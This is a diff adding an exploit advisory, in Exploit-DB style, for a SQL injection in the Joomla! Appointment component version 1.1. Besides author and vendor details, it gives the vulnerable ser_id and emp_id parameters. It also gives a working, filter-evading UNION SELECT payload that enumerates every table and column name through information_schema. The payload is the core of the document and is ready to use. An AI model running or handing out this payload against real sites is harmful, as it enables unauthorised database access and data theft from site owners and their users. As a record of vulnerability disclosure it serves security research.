@@ -1,0 +1,30 @@
+# # # # #
+# Exploit Title: Joomla! Component Appointment v1.1 - SQL Injection
+# Dork: N/A
+# Date: 18.08.2017
+# Vendor Homepage: https://www.joomlaextensions.co.in/
+# Software Link: https://extensions.joomla.org/extensions/extension/appointment/
+# Demo: http://joomlaextension.biz/appointment/
+# Version: 1.1
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows the working user group to inject sql commands ...
+# 	
+# Proof of Concept:
+# 
+# http://localhost/[PATH]/index.php/service-list?view=allorder&ser_id=[SQL] 
+# -84+/*!11111union*/+/*!11111select*/+(sELECT+eXPORT_sET(0x35,@:=0,(sELECT+cOUNT(*)fROM(iNFORMATiON_sCHEMA.cOLUMNS)wHERE@:=eXPORT_sET(0x35,eXPORT_sET(0x35,@,tABLE_nAME,0x3c6c693e,2),cOLUMN_nAME,0xa3a,2)),@,0x32))--+-
+# 
+# http://localhost/[PATH]/index.php/service-list?view=allorder&emp_id=[SQL]
+# 
+# <input type="hidden" name="sername" id="sername" value="............
+# 
+# Etc...
+# # # # #
